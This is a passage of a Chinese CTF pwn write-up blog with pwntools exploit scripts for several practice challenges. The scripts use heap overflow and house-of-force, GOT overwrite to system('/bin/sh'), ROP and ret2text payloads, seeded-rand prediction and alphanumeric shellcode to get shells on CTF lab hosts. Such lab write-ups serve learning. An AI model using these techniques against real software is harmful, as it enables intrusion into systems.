class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28951</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">l33t = <span class="number">0x0000000000400C50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, (content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, <span class="string">&#x27;aaaa&#x27;</span>)  <span class="comment">#0号堆块堆溢出时使用</span></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&#x27;cccc&#x27;</span>)  <span class="comment">#2号堆块防止1号堆块和topchunk合并</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">magic_addr = <span class="number">0x06020A0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x50</span>, <span class="number">0x30</span> * <span class="string">b&quot;a&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(magic_addr - <span class="number">0x10</span>))  <span class="comment">#bk处magic-0x10是为了伪造成堆指针，从而伪造堆块</span></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = process(&#x27;./bcloud_bctf_2016&#x27;)</span><br><span class="line"># p = remote(&#x27;node5.buuoj.cn&#x27;, &#x27;27131&#x27;)</span><br><span class="line">elf = ELF(&#x27;./bcloud_bctf_2016&#x27;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(leng, con):</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;:&#x27;, str(leng))</span><br><span class="line">    p.sendlineafter(&#x27;:&#x27;, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.sendlineafter(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, con):</span><br><span class="line">    p.sendlineafter(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;:&#x27;, str(idx))</span><br><span class="line">    p.sendlineafter(&#x27;:&#x27;, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.sendlineafter(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;:&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(&#x27;name:&#x27;, &#x27;a&#x27; * 0x40)</span><br><span class="line">p.recvuntil(&#x27;a&#x27; * 0x40)</span><br><span class="line">leak = u32(p.recv(4))</span><br><span class="line">print(&quot;leak:&quot; + hex(leak))</span><br><span class="line">p.sendafter(&#x27;Org:&#x27;, &#x27;b&#x27; * 0x40)</span><br><span class="line">p.sendlineafter(&#x27;Host:&#x27;, p32(0xFFFFFFFF))  #修改top chunk的size</span><br><span class="line">top_chunk = leak + 0xd0</span><br><span class="line">print(&quot;top_chunk: &quot; + hex(top_chunk))</span><br><span class="line">chunk_addr = 0x0804B120</span><br><span class="line">offset = chunk_addr - top_chunk - 0x10</span><br><span class="line">add(offset, &#x27; &#x27;)  #0</span><br><span class="line"></span><br><span class="line">#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了</span><br><span class="line">add(0x18, &#x27;a&#x27;)  #1</span><br><span class="line"></span><br><span class="line">#修改heap_array</span><br><span class="line">edit(1, p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">#修改free的got表为puts的plt表</span><br><span class="line">edit(1, p32(puts_plt) + b&#x27;\n&#x27;)</span><br><span class="line">#泄露puts的地址</span><br><span class="line">dele(2)</span><br><span class="line">leak = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">print(&quot;puts_got: &quot; + hex(leak))</span><br><span class="line">libcbase = leak - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print(&quot;libcbase: &quot; + hex(libcbase))</span><br><span class="line">system = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">edit(1, p32(system))</span><br><span class="line">dele(3)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h3 id="SWPUCTF-2021-新生赛-gift-pwn"><a href="#SWPUCTF-2021-新生赛-gift-pwn" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn"></a>[SWPUCTF 2021 新生赛]gift_pwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">alexio = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="string">&quot;28791&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">24</span>*<span class="string">b&quot;A&quot;</span>+ p64(<span class="number">0x400673</span>) + p64(<span class="number">0x4006A6</span>) + p64(<span class="number">0x4005CE</span>)<span class="comment">#重温系统调用 rdi|ret + &quot;binsh&quot; + system</span></span><br><span class="line"></span><br><span class="line">alexio.send(payload)</span><br><span class="line"></span><br><span class="line">alexio.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2020-babystack"><a href="#BJDCTF-2020-babystack" class="headerlink" title="[BJDCTF 2020]babystack"></a>[BJDCTF 2020]babystack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">alexio = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="string">&quot;28679&quot;</span>)</span><br><span class="line">payload = <span class="number">24</span>*<span class="string">b&quot;A&quot;</span> + p64(<span class="number">0x4006EA</span>) + p64(<span class="number">0x4006EF</span>)<span class="comment">#0x4006EA是text段的mov edi, offset command ; &quot;/bin/sh&quot; 所以不需要在前面加pop某寄存器的地址</span></span><br><span class="line"></span><br><span class="line">alexio.recvline(<span class="string">&quot;Please input the length of your name:\n&quot;</span>)</span><br><span class="line">alexio.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">alexio.sendline(payload)</span><br><span class="line">alexio.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CISCN-2019华北-PWN1"><a href="#CISCN-2019华北-PWN1" class="headerlink" title="[CISCN 2019华北]PWN1"></a>[CISCN 2019华北]PWN1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">alexio = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="string">&quot;28553&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>-<span class="number">0x4</span>)+p64(<span class="number">0x41348000</span>)<span class="comment">#ucomiss xmm0, cs:dword_4007F4这是用于比较两个单精度浮点数的指令,dword_4007F4里面是将十进制数转换为IEEE 754标准的单精度浮点得到的十六进制数</span></span><br><span class="line"></span><br><span class="line">alexio.sendline(payload)</span><br><span class="line">alexio.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#当然还可以ret2text覆盖之后自己构造语句实现cat /flag</span></span><br></pre></td></tr></table></figure><h3 id="NISACTF-2022-ezstack"><a href="#NISACTF-2022-ezstack" class="headerlink" title="[NISACTF 2022]ezstack"></a>[NISACTF 2022]ezstack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">alexio = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="string">&quot;28857&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">76</span>)+p64(system)+p64(<span class="number">0x0804A024</span>)<span class="comment">#当程序调用system函数时，会自动去寻找栈底即ebp指向的位置，然后将ebp+8字节的位置的数据当作函数的参数，所以如果我们想将/bin/sh作为system函数的参数，就可以在栈溢出的时候，先修改eip为system函数的地址，然后填充4个字节的垃圾数据，再将/bin/sh的地址写入栈上，这样调用system函数的时候，就可以将/bin/sh作为参数，然后返回一个shell。(这是为什么可以在system后面补4个字节的原因</span></span><br><span class="line">alexio.recvline()</span><br><span class="line"></span><br><span class="line">alexio.send(payload)</span><br><span class="line"></span><br><span class="line">alexio.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NewStarCTF2023"><a href="#NewStarCTF2023" class="headerlink" title="NewStarCTF2023"></a>NewStarCTF2023</h1><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><ul><li><p><strong>考点</strong>：ctypes，pwntools</p></li><li><p><strong>FLAG</strong>：动态FLAG</p></li><li><p><strong>解题步骤</strong></p></li></ul><p>利用ctypes库在python代码中调用c语言函数，可以与程序生成同样的伪随机数</p><p>创建一个名为 random1.c 的C语言源代码文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_seed</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">time_t</span> seed = time(<span class="literal">NULL</span>);</span><br><span class="line">   srand(seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">random_number</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> rand();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这个C语言源文件为一个动态链接库（.so文件）。</p><p>编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o random1.so random1.c</span><br></pre></td></tr></table></figure><p>本题exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">tob = <span class="keyword">lambda</span> text: <span class="built_in">str</span>(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载动态链接库</span></span><br><span class="line"></span><br><span class="line">lib = ctypes.CDLL(<span class="string">&#x27;./random1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于题目是在&quot;2$031&quot;中随机组成system函数的参数，</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 推测当参数为$0、$1...时可以getshell,所以多次尝试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">try</span>:  <span class="comment"># 使用try-except解决有时远程连接出错问题，其实不用也可以</span></span><br><span class="line">    </span><br><span class="line">     <span class="comment"># sh = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">        </span><br><span class="line">     sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28321</span>)</span><br><span class="line">    </span><br><span class="line">     <span class="comment"># 设置函数返回类型为整数</span></span><br><span class="line">     lib.random_number.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 调用C语言的set_seed函数</span></span><br><span class="line">     lib.set_seed()</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 调用C语言的random_number函数</span></span><br><span class="line">     result = lib.random_number()</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 打印日志</span></span><br><span class="line">     log.success(<span class="string">&quot;result==&quot;</span> + <span class="built_in">hex</span>(result))</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 发送我们的答案</span></span><br><span class="line">     sh.recvuntil(<span class="string">b&quot;?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">     sh.sendline(tob(result))</span><br><span class="line">        </span><br><span class="line">     <span class="comment"># 试探一下()</span></span><br><span class="line">     sh.sendline(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">     answer = sh.recv(timeout = <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&#x27;sh&#x27;</span> <span class="keyword">in</span> answer:  <span class="comment"># 排除类似&quot;sh: 1: 23: not found\n&quot;的报错信息</span></span><br><span class="line">            </span><br><span class="line">       sh.close()</span><br><span class="line"></span><br><span class="line">     <span class="keyword">elif</span> <span class="string">b&#x27;Haha you are wrong&#x27;</span> <span class="keyword">in</span> answer: <span class="comment"># 排除某些时候猜错数字，虽然概率较小</span></span><br><span class="line"></span><br><span class="line">       sh.close()</span><br><span class="line"></span><br><span class="line">     <span class="keyword">else</span>: </span><br><span class="line"></span><br><span class="line">       <span class="comment"># 剩下的应该就是有回显的getshell情况了</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># sh.sendline(b&#x27;date -f flag&#x27;)</span></span><br><span class="line"></span><br><span class="line">       sh.interactive()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">     sh.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="shellcode-revenge"><a href="#shellcode-revenge" class="headerlink" title="shellcode revenge"></a>shellcode revenge</h3><blockquote><p><a href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p></blockquote><p>string.printable - 可见字符串shellcode</p><p>alpha3生成：</p><p>将shellcode重定向到一个文件中<br>切换到alpha3目录中，使用alpha3生成string.printable</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd alpha3</span><br><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;存储shellcode的文件&quot; &gt; 输出文件</span><br></pre></td></tr></table></figure><p>python手动：</p><p>打印满足过滤条件的三字符组合对应的汇编代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;1234567890ABCDEF&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> a:</span><br><span class="line">            sc = <span class="string">f&#x27;<span class="subst">&#123;i1&#125;</span><span class="subst">&#123;i2&#125;</span><span class="subst">&#123;i3&#125;</span>&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(disasm(sc.encode()))</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>手搓可见字符串shellcode参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nets.ec/Alphanumeric_shellcode</span><br></pre></td></tr></table></figure><h1 id="NKCTF-2024"><a href="#NKCTF-2024" class="headerlink" title="NKCTF 2024"></a>NKCTF 2024</h1><h3 id="Maimai查分器"><a href="#Maimai查分器" class="headerlink" title="Maimai查分器"></a>Maimai查分器</h3><p>存在PIE和Canary保护</p><p>第一次<code>send(b&#39;1&#39;)</code>进入<code>sub_188C()</code>函数，再输入50次 chart level 和 rank 。但不能2次使得  v5 &#x3D; 15.0 否则程序会判断为非法输入从而终止。需要使计算后v6满足该条件 <code>(int)v6 = dword_504C &lt; dword_5010</code> 在后面才能进 <code>sub_1984();</code> 函数，所以对 v5 尽可能大地赋值，我这里赋值<code>v5=1600000</code>，同样对v7赋值使得return到的值尽可能大，当 <code>v7 = &quot;SSS+&quot;</code> 时最大</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sub_188C()&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    sub_188C();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_188C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%lf %s&quot;</span>, &amp;v5, v7);</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">15.0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v0 = v3++;</span><br><span class="line">          <span class="keyword">if</span> ( v0 == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sub_1633(v7);</span><br><span class="line">    v6 = v0 * v5 + v6;</span><br><span class="line">      &#125;</span><br><span class="line">    dword_504C = (<span class="type">int</span>)v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_1633</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;SSS+&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x4036666666666666</span>LL;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后send(b’2’)使得<code>v3=2</code>break循环，进入sub_19EA函数，<code>printf(buf);</code>存在格式化字符串漏洞，第一次先泄露__libc_start_call_main地址（这里是一个重点: <strong>elf中的 _libc_start_call_main 函数作用是转移控制权到libc的 _libc_start_main函数</strong>，因此, _libc_start_call_main 在ELF中的地址,相当于 _libc_start_main 在加载后libc库的地址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">2</span> &amp;&amp; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_19EA();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_19EA</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;, your rating is: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)dword_504C);</span><br><span class="line">  <span class="keyword">if</span> ( dword_504C &lt; dword_5010 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I think you should play more maimai.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1984();</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是当时找libc基地址写的一次性泄露Canary PIE libc的部分脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 